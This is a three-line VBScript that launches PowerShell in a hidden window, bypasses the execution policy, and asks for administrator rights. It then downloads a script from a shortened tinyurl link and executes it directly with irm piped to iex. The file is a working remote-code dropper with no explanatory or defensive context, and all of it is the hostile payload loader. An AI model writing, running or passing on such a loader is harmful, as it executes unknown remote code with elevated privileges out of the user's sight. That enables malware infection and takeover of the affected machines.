Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""Start-Process PowerShell -ArgumentList 'irm ""https://tinyurl.com/4j72ashp/"" | iex' -Verb RunAs""", 0, False
Set objShell = Nothing
